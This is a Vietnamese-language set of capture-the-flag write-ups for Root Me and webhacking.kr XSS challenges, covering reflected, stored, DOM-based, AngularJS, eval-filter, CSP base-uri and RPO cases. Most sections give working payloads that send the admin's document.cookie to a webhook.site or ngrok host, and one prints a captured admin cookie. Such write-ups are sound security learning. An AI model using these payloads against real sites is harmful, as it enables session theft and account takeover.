# Root Me/XSS - Reflected

![](https://i.imgur.com/OLPkPO2.png)

Link to chall: http://challenge01.root-me.org/web-client/ch26

## Phân tích

Sau khi vào trang web em test thử các tính năng của web và nhận thấy có trang `/contact` truy cập vào đây em thấy có form để em gửi cho admin

![](https://i.imgur.com/DpyiwM3.png)

Ban đầu do không đọc đoạn tiếng anh bên trên nên em đã mất khá nhiều thời gian để test payload ở những thẻ input của form. Nhưng sau khi bất lực em bắt đầu dịch đoạn tiếng anh trên và không ngờ:
`Giống như hầu hết các doanh nghiệp, không ai thực sự kiểm tra bất kỳ phản hồi nào trong số này, nhưng để có vẻ như chúng tôi quan tâm, chúng tôi đã tạo một form hoàn toàn vô dụng mà bạn có thể điền vào.`

**Form đấy vô dụng :<**

Giờ đây em bắt đầu tìm hướng khác, en bắt đầu để ý đến url, website sử dụng tham số `p` để xác định page mà client muốn truy cập. Em thử thay đổi nó bằng một giá trị bất kỳ:

![](https://i.imgur.com/jCBjA61.png)

Đây rồi!!! Dấu hiệu của xss đây rồi~~~

## Khai thác

Bắt đầu bằng việc thử alert em dùng payload sau: `?p=contactt' onclick='alert(1)`

![](https://i.imgur.com/20dYthg.png)

Khi em click vào link đó alert đã hiện ra :+1: 

![](https://i.imgur.com/2pAG45t.png)

Giờ để lấy cắp được cookie của admin em thực thiện fetch đến một link mà em sở hữu để theo dõi các yêu cầu http (ở đây em dùng [Webhook](https://webhook.site/))

Với payload: ```?p=contactt' autofocus onfocus='fetch(`[Link webhook]?cookie=${document.cookie}`)```

![](https://i.imgur.com/1gscUGw.png)

Mọi thứ có vẻ đã đúng rồi, giờ em `Report to the admin...` và đợi cookie của admin trả về ở phía webhook thôi :face_with_finger_covering_closed_lips: 

![](https://i.imgur.com/dDYoN99.png)



---


# Root Me/XSS - Stored 1

![](https://i.imgur.com/aqMQatu.png)

Link to chall: http://challenge01.root-me.org/web-client/ch18/

## Phân tích

Sau khi vào trang web và test thử các tính năng của web em thấy rằng website cho phép chúng ta post comment của mình lên và comment đó sẽ được lưu lại.

Thử ngay payload `<script>alert(1)</script>` em thấy nó không bị filter và một cửa sổ alert(1) được hiện ra.\

![](https://i.imgur.com/p1chHuG.png)

Vậy là website dính lỗ Stored XSS tại phần `message:`

## Khai thác

Để có thể nhận được cookie của admin em làm như sau:

1. Truy cập vào [Webhook](https://webhook.site/) để nhận một link giúp em kiểm tra và theo dõi các yêu cầu HTTP đến link đó.
2. Tạo payload để fetch api đến link đó: 
```html
<script>fetch(`[Link mà em nhận được từ webhook]?cookie=${document.cookie}`)</script>
```
3. Post comment chứa payload và sang Webhook chờ Admin truy cập website dính lỗi XSS, và khi cookie của Admin sẽ được gửi đến Webhook:

![](https://i.imgur.com/P4zX6hz.png)

Sử dụng cookie đó đê submit và em đã solve challenge: `ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6`

---

# Root Me/XSS - Stored 2

![](https://i.imgur.com/xa2Nvjf.png)

Link to chall: http://challenge01.root-me.org/web-client/ch19/

## Phân tích

Sau khi truy cập website em thử các tính năng của web. Web cho chúng ta post comment, dựa theo chall trước em bắt đẩu fuzz thử các payload xss thông dụng nhưng ở phần post comment đó tất cả các payload đều bị filter.

![](https://i.imgur.com/bJDBVrs.png)

Nhưng ở chall này phần comment có thêm một thẻ `<i>` để xác định trạng thái của người post comment.

Thử đưa vào Burp suite để bắt request và phân tích xem status của em được xác định dựa vào đâu
    
![](https://i.imgur.com/qqCCjn6.png)

Vậy là status của em do cookie status quy định, giá trị của cookie này sẽ được thêm thẳng vào thẻ `<i>` trong DOM trả về. Dựa vào đây em có thể thực hiện tấn công XSS.


## Khai thác

Theo ý tưởng của chall trước em tiếp tục tạo ra payload để khi admin truy cập trang web dính lỗi XSS đó, trình duyệt của admin sẽ tự fetch đến webhook của em và kèm theo cookie của admin.

Payload: ```"><script>fetch(`[Link webhook]?cookie=${document.cookie}`)</script>```

![](https://i.imgur.com/DF61uRo.png)

Sau đó em qua Webhook chờ admin truy cập website để nhận được cookie của admin:

![](https://i.imgur.com/YVMH6N3.png)

Sử dụng cookie đó thêm vào request và lấy flag:

![](https://i.imgur.com/Hc6wcsr.png)

---

# Root Me/XSS - DOM Base Introduction

![](https://i.imgur.com/L31ekLg.png)

Link to chall: http://challenge01.root-me.org/web-client/ch32/

## Phân tích

Em truy cập website và bắt đầu tìm hiểu các tính năng của website, thấy website cho ta nhập 1 số rồi gửi. Sau khi test thử vài số bất kỳ thấy sai, dựa theo tên bài DOM based em `Ctrl U` để đọc source code và thấy đoạn script sau:

```javascript
var random = Math.random() * (99);
    var number = 'a';
    if(random == number) {
        document.getElementById('state').style.color = 'green';
        document.getElementById('state').innerHTML = 'You won this game but you don\'t have the flag ;)';
    }
    else{
        document.getElementById('state').style.color = 'red';
        document.getElementById('state').innerText = 'Sorry, wrong answer ! The right answer was ' + random;
    }
```

Mục đích của đoạn mã này là lấy số bất kỳ mà e nhập vào so sánh với số được sinh ra bởi hàm random :face_palm: 
Giả sử như em cực kỳ may mắn hoặc bằng 1 cách nào đó nhập đúng số sinh ra bởi hàm random thì em cũng sẽ không có được flag :-1: 

Bỏ qua phần bên trên, điều em chú ý đến là param number em nhập vào được truyền thằng vào biến number trong đoạn mã, đây chính là dấu hiệu cho em bắt đầu thực hiện DOM based XSS.

## Khai thác

Bắt đầu bằng việc thử với alert: `?number=a%27;%20alert(1);%20//`

![](https://i.imgur.com/boANbS4.png)

Và đây là đoạn js được lưu trong DOM: 
```javascript
 var random = Math.random() * (99);
    var number = 'a'; alert(1); //';
    if(random == number) {
        document.getElementById('state').style.color = 'green';
        document.getElementById('state').innerHTML = 'You won this game but you don\'t have the flag ;)';
    }
    else{
        document.getElementById('state').style.color = 'red';
        document.getElementById('state').innerText = 'Sorry, wrong answer ! The right answer was ' + random;
    }
```

Giờ để lấy được cookie của admin em thực hiện tạo một link đến website bị lỗi DOM based XSS chứa script chuyển hướng admin vào link webhook em sở hữu kèm theo cookie của admin:

```url
http://challenge01.root-me.org/web-client/ch32/index.php?number=a%27;%20window.location.href=`[Link webhook]?cookie=${document.cookie}`;//
```

Gửi đoạn url này cho admin ở page `/contact` và ở webhook chờ cookie của admin về thoiii :face_with_finger_covering_closed_lips: 

![](https://i.imgur.com/IPiKivr.png)


---

# Root Me/XSS - DOM Based AngularJS

![](https://i.imgur.com/JpP5Cys.png)

Link to char: http://challenge01.root-me.org/web-client/ch35/

## Phân tích 

Vào website test thử các tính năng của web và thấy web cho chúng ta nhập tên và sau khi bấm create thì website sẽ dùng method get để thực thi form.

```javascript
    var name = 'a';
        var encoded = '';
        for(let i = 0; i < name.length; i++) {
                encoded += name[i] ^ Math.floor(Math.random() * name.length);
        }
        encoded = Math.abs(encoded ^ Math.floor(Math.random() * name.length));
        document.getElementById('name_encoded').innerText += ' ' + encoded;
```

Param name em nhập vào sẽ được truyền thẳng vào đoạn mã trên nhưng sau khi thử vài payload xss cơ bản đều bị filter. Dựa theo tên bài em bắt đầu thử test payload XSS Angular: `{{1+1}}`

![](https://i.imgur.com/mIdJDPb.png)

Và thấy nó thực thi được, dấu hiệu của XSS Angular đây rùiii

## Khai thác

Vì `1+1` ở bên trên chỉ là toán tử js bình thường nên để tìm chuẩn payload em cần xác định phiên bản angularjs đang sử dụng.

![](https://i.imgur.com/NMCD8Ux.png)

Lướt lên trên phần head em thấy rằng đây là phiên bản 1.6.9~ Ngon rùi :face_with_hand_over_mouth: 

Giờ lên payload all the thing tìm payload phù hợp thoiii!

Và thế là em tìm thấy payload này:

`{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}`

Về cơ bản thì payload này gồm 2 phần:
1. `x=valueOf.name.constructor.fromCharCode;` Đoạn code x=valueOf.name.constructor.fromCharCode trong JavaScript có chức năng gán giá trị của thuộc tính fromCharCode của hàm khởi tạo (constructor function) của đối tượng được lưu trữ trong thuộc tính name của đối tượng được lưu trữ trong biến valueOf cho biến x.
2. Đoạn code constructor.constructor(x(97,108,101,114,116,40,49,41))() trong JavaScript có chức năng tạo ra một đối tượng mới bằng cách gọi đến hàm khởi tạo (constructor function) của hàm khởi tạo (constructor function) của đối tượng hiện tại và truyền vào một chuỗi có chứa mã Unicode của các ký tự "alert(1)".

> Trong JavaScript, hàm khởi tạo (constructor function) của một đối tượng cũng là một đối tượng và có thể chứa các thuộc tính và phương thức giống như các đối tượng khác. Trong trường hợp này, valueOf.name.constructor là hàm khởi tạo của đối tượng được lưu trữ trong thuộc tính name của đối tượng được lưu trữ trong biến valueOf.
Phương thức fromCharCode() là một phương thức có sẵn của đối tượng String trong JavaScript, được sử dụng để chuyển đổi mã Unicode của các ký tự thành chuỗi ký tự tương ứng. Vì vậy, x = valueOf.name.constructor.fromCharCode sẽ gán giá trị của phương thức fromCharCode() của hàm khởi tạo đối tượng được lưu trữ trong name cho biến x.
Với giá trị của x được gán như vậy, ta có thể sử dụng nó để tạo chuỗi ký tự từ mã Unicode của các ký tự bằng cách gọi x(charCode1, charCode2, ...). Chẳng hạn, nếu valueOf.name.constructor là hàm khởi tạo của đối tượng String, thì x(65, 66, 67) sẽ trả về chuỗi "ABC".
Để hiểu rõ hơn về đoạn code này, chúng ta có thể giải thích từng phần như sau:
x(97,108,101,114,116,40,49,41): Gọi phương thức x với tham số là các mã Unicode của các ký tự trong chuỗi "alert(1)". Phương thức x trong trường hợp này là phương thức fromCharCode() của đối tượng String, được lấy từ thuộc tính fromCharCode của hàm khởi tạo của đối tượng String.
constructor.constructor(...): Truy cập đến hàm khởi tạo của đối tượng hiện tại thông qua thuộc tính constructor. Sau đó, truy cập đến hàm khởi tạo của hàm khởi tạo đó thông qua thuộc tính constructor một lần nữa. Điều này cho phép chúng ta gọi đến hàm khởi tạo của hàm khởi tạo của đối tượng hiện tại.
(...)(): Gọi hàm khởi tạo của hàm khởi tạo của đối tượng hiện tại và truyền vào chuỗi "alert(1)" dưới dạng tham số. Sau đó, đối tượng mới được tạo ra từ hàm khởi tạo này sẽ được gọi và thực thi, dẫn đến việc hiển thị thông báo "1" trên trình duyệt nếu được chạy trên môi trường trình duyệt.
Tuy nhiên, đoạn mã này là một ví dụ của một lỗ hổng bảo mật trong JavaScript gọi là "cross-site scripting (XSS)" và được sử dụng để thực hiện các cuộc tấn công bảo mật. Do đó, tuyệt đối không nên sử dụng nó trong các ứng dụng thực tế.
Xem thêm tại [XSS AngularJS](https://www.youtube.com/watch?v=67Yc8_Bszlk&list=PLhixgUqwRTjwJTIkNopKuGLk3Pm9Ri1sF)

Bỏ qua đoạn nhiều chữ khó hiểu bên trên thì điều đọng lại là payload này nó hoạt động :+1: 

![](https://i.imgur.com/76XDB9T.png)

Để lấy được cookie của admin em cần tạo ra một link để gửi cho admin. Khi admin nhấn vào link đó thì cookie của admin sẽ được chuyển hướng đến website đó:

`{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 46, 104, 114, 101, 102, 61, 96, 104, 116, 116, 112, 115, 58, 47, 47, 119, 101, 98, 104, 111, 111, 107, 46, 115, 105, 116, 101, 47, 49, 57, 102, 49, 50, 50, 57, 48, 45, 57, 55, 52, 102, 45, 52, 101, 97, 56, 45, 57, 101, 53, 98, 45, 56, 52, 97, 102, 50, 56, 48, 54, 98, 101, 102, 102, 63, 99, 111, 111, 107, 105, 101, 61, 36, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 125, 96))()}}`

Sau đó em sẽ sang webhook để chờ cookie của admin được gửi về:

![](https://i.imgur.com/nqrnJWw.png)


---


# Root Me/XSS - DOM Based Eval

![](https://i.imgur.com/1JkNAtc.png)

Link to chall: http://challenge01.root-me.org/web-client/ch34/

## Phân tích

Tương tự như bài DOM based bên trên nhưng khác là tên bài lần này là eval, Em bắt đầu test thử các tính năng của website, thấy rằng website cho phép chúng ta nhập vào dữ kiện của phép tính sau đó sẽ lấy dữ kiện đó đưa vào hàm eval() để tính ra kết quả và chèn vào DOM:

`?calculation=1*1`

```html
    <div id="state"></div>
    <script>
        var result = eval(1*1);
        document.getElementById('state').innerText = '1*1 = ' + result;
    </script>
```

Nhưng bài này đã có những filter rất khó chịu :<

1. Đầu tiên là phép tính phải có định dạng phù hợp với regex sau `/^\d+[\+|\-|\*|\/]\d+/`. Đoạn này nó sẽ lấy bắt đầu từ đầu phép tính ta nhập vào và kiểm tra xem ký tự đầu tiên có phải là các chữ số không, nếu là các chữ số rồi thì tiếp theo sau nó có phải là các toán tử như +, -, *, / không, nếu là các toán tử đó rồi thì tiếp tục xem xem sau các toán tử đó có phải là các chữ số hay không? Nếu thỏa mãn thì phép tính mới được tính.
-> Để vượt qua đoạn regex này khá dễ em chỉ cần nhập 3 ký tự đầu tiên chuẩn theo format của regex là được: `?calculation=1*1*1337`
2. Sau khi đã qua được regex em bắt đầu thử gọi hàm trong eval(), em bắt đầu thử với alert(1): `?calculation=1*1*alert(1)` và nó không hoạt động vì website đã filter dấu ngoặc đơn `( )` :cry: Sau một hồi tìm kiếm thì em thấy có thể thay dấu ngoặc đơn bằng ký tự ``` `` ```: ```?calculation=1*1*alert`1` ``` Và nó thành công
![](https://i.imgur.com/CfqVSMq.png)
Hí hửng em thay hàm `alert` bằng hàm `fetch`: ``` ?calculation=1*1*fetch`[Link webhook]?cookie=${document.cookie}` ``` và nghĩ rằng sẽ dễ dàng giải quyết được bài này, nhưng không :cry:.
Vấn đề không phải do hàm fetch không hoạt động, nó có fetch đến webhook của em nhưng còn về cookie, không thể lấy được cookie khi em đang ở trong hàm `eval()` việc filter dấu ngoặc làm ngăn chặn mọi cách mà em nghĩ ra :cry: 

Mất phương ướng em đã quyết định tìm đến solution, và...
Vcccccccccccccccccccccccccccccc

Em đã chỉ tập chung vào hàm `eval()` mà không nhìn tất cả. Phép tình ngoài việc được đưa vào hàm `eval()` ra nó còn được biến thành chuỗi để đưa vào đằng trước kết quả của hàm eval() sau đó mới InnerText để hiện thị ra màn hình ``` document.getElementById('state').innerText = '1*1 = ' + result; ```

![](https://i.imgur.com/a1G01DX.png)

## Khai thác

Hướng khai thác mới đã có việc cần làm bây giờ chỉ là đóng chuỗi `'1*1 = '` lại và chèn đoạn script của em vào thôi.

Nhưng trước hết vẫn phải bypass qua được regex và filter. Em thử payload: ```1*1/*';alert`1`;//*/``` và em có kết quả như sau:

![](https://i.imgur.com/3iBKRfc.png)

- Dùng `/* */` để khiến eval hiểu phần bên trong đó là comment và không tiếp tục check regex và filter.
- Dấu `'` đầu tiên dùng để kết thúc chuỗi `'1*1/*'` để em có thể viết code js phía sau nhưng như vậy làm cho ký tự mở đầu đầu của comment cũng đã bị mất nên em phải thêm ký tự comment `//` ở đằng sau câu lệnh js của em để nó comment ký tự đóng comment đã thêm vào từ trước đó.

Vì dấu ngoặc đơn `( )` bị filter (không  thể dùng `fetch()` được) nên bây giờ để lấy được cookie của admin em sẽ chuyển hướng admin sau khi click vào link đến webhook mà em kiểu soát bằng `1*1/*';window.location.href='[Link webhook]?cookie='%2bdocument.cookie;//*/`

Sang webhook ngồi chờ cookie về thôi :face_with_hand_over_mouth: 

![](https://i.imgur.com/r1CXZ3b.png)

Sau bài này thì em rút ra kinh nhiệm sương máu là phải quan sát kỹ hơn, đừng nhanh nản rồi tìm đến solution vì sau này những thứ em gặp phải sẽ không có solution để cho em tìm :cry: 

P/s: Và nếu tiếp tục vọc vạch `eval()` không bỏ cuộc thì có lẽ em còn có thể sử dụng được thêm payload khác: ```1*1&&"alert`1`"``` Đưa toán từ `&&` (AND) vào payload để thực thi biểu thức ``` alert`1` ``` thay alert bằng `1*1&&"window.location.href=\"[Link webhook]?cookie=\"%2bdocument.cookie"` và thế là có thể thực hiện lấy được cookie admin là chỉ dựa vào hàm `eval()` 

---

# Webhacking/BABY

![](https://i.imgur.com/E4QLjpf.png)

Link to chall: http://webhacking.kr:10010/

## Phân tích

Trang web cho em inject vào DOM bất kỳ thứ gì nên em bắt đầu thử inject vài đoạn script xss cơ bản: `<script>alert(1)</script>`

![](https://i.imgur.com/fdAoZXm.png)

Đoạn `<script src=/script.js nonce=....></script>`
Dùng để tạo ra link đến page `/report.php` và mã js đó nằm trong file `./script.js` của server website:

![](https://i.imgur.com/3KNPobU.png)


Mặc dù inject vào DOM thành công như đoạn mã js đó lại không được thực thi do website đã sử dụng CSP: `Content-Security-Policy: script-src 'nonce-hBgeLOc+dhrtx8PVXiMjqUn4gTM=';`

Vậy nên chỉ những content được cho phép mới được thực thi.

Em sử dụng công cụ [CSP Evaluator](https://csp-evaluator.withgoogle.com/): để xem CSP này có bỏ xót gì không và đúng như mong đợi chúng ta có 2 hướng để khai thác: 

![](https://i.imgur.com/mBThMXv.png)

Đó là `object-src` và `base-uri` thử vài payload cơ bản với 2 loại này em xác định được chall này dính `base-uri`: `http://webhacking.kr:10010/?inject=%3CBase%20Href=//X55.is%3E`

![](https://i.imgur.com/gXTzRC6.png)

Xác định được hướng em bắt đầu đi exploit

## Khai thác

Bước đầu tiên là em cần host 1 file có tên trùng với tên mà file js mà website dùng để tạo ra link đến page `/report.php`. Vậy nên tên file phải là `script.js`. trong file em viết script để khi file được gọi nó sẽ chuyển hướng trang đến webhook mà em sở hữu: `location.href='https://webhook.site/19f12290-974f-4ea8-9e5b-84af2806beff?flag='+document.cookie;`

![](https://i.imgur.com/4TkKRLW.png)

Host file bằng ngrok và khi inject thì em dùng thẻ base để đổi base uri của trang web. Vậy nên em có payload: `?inject=<base href="https://e7fd-2a09-bac5-d45f-e6-00-17-16b.ap.ngrok.io">`

Thử tự test cookie của em có trả về:

![](https://i.imgur.com/CTvAykB.png)


Gửi cho nó admin và chờ cookie của admin trả về

![](https://i.imgur.com/aRNz36h.png)

Nhưng không hiểu saoooooooooo nó không chạy :cry: 

Không hiểu em sai ở đâu, em đã lên tìm thử write up và thấy họ cũng làm vậy T.T

**SOS**

---

# Webhacking/PRO

![](https://i.imgur.com/tID6kV4.png)

Link to chall: http://webhacking.kr:10011/

## Phân tích

Sau khi vào trang web ngoài trừ `report` page thì không thể bấm vào được đâu để test tính năng của web nữa, nên em đã ctrl u để đọc source code:

![](https://i.imgur.com/LvdBUiS.png)

Em thấy website sử dụng XMLHttpRequest để call api tới `api.php/search + một từ trong mảng location[]`

![](https://i.imgur.com/DLM6MYh.png)

Call thử api theo đường link đó và em thấy server trả về cho em một object chứa đúng thông tin mà website sử dụng để hiện thị khi trỏ chuột vào `hoth`.

Có lẽ đây là vị trí truyền dữ liệu duy nhất mà chúng ta kiểm soát.

Em bắt đầu chèn thử một vài path bất kỳ: 

![](https://i.imgur.com/8R80OoU.png)

![](https://i.imgur.com/mL1ZgPL.png)

![](https://i.imgur.com/GhUr5kO.png)

Sau khi thử vài lần em xác định được web server là nginx, dấu ngoặc < > và các ký tự trong nó đều bị filter.

Thực sự thì rất là bế tắc. Sau khi đi xin hint thì em được hint đây là lỗi RPO, bắt đầu đi tìm hiểu về lỗi này. Sau một hồi tìm doc thì chúng ta có thể thực hiện tất công rpo với web server nginx bằng url decoding

## Khai thác

Em bắt đầu bằng việc tạo một result giả để thay cho XMLHttpRequest() được gọi: `{"results":[{"name":"a","terrain":"a","population":"a","diameter":"1"}]}`

Nếu chỉ để như vậy thì đoạn dữ liệu trả về sẽ kèm theo not found:

![](https://i.imgur.com/TxSlime.png)

Để xóa được chữ not found em dựa vào việc web filter ký tự < > và dữ liệu bên trong nó nên em đã thêm vào payload `<a`: `{"results":[{"name":"a","terrain":"a","population":"a","diameter":"1"}]}<a`

Và thế là chữ not found đã biến mất:

![](https://i.imgur.com/eWpbAcN.png)

Giờ đến RPO: `http://webhacking.kr:10011/api.php/search/{"results":[{"name":"a","terrain":"a","population":"a","diameter":"1"}]}<a/..%2f..%2f..%2f` 

Vì web server là nginx nên khi em encode ký tự `/` thành `%2f` nên server sẽ không decode nhưng payload đó được thực hiện trong js và nó sẽ hiểu đoạn payload của em như sau: `http://webhacking.kr:10011/api.php/search/{"results":[{"name":"a","terrain":"a","population":"a","diameter":"1"}]}<a/../../../api.php`

Và kết quả em nhận được là: 

![](https://i.imgur.com/xp6RKbT.png)

Đã RPO thành công giờ em cần XSS lấy cookie admin nhưng vấn đề ở đây là ký tự < đã bị filter và web sẽ xóa hết những gì giữa < và > vậy nên giờ em phải bypass ký tự <, và sau 1 hồi tìm kiếm thì em sử dụng unicode và url encode để bypass ký tự `<` = `%5cu003c`:

Payload: `{"results":[{"name":"%5cu003cimg src=a onerror=location.href='https://webhook.site/19f12290-974f-4ea8-9e5b-84af2806beff?c='+document.cookie>","terrain":"a","population":"a","diameter":"1"}]}<a/..%2f..%2f..%2f`

Và vẫn giống như chall trước T.T em tự test trên trình duyệt thì được nhưng khi report cho admin thì chờ mãi không thấy cookie của admin đâu :cry: 

![](https://i.imgur.com/ttoIt2w.png)
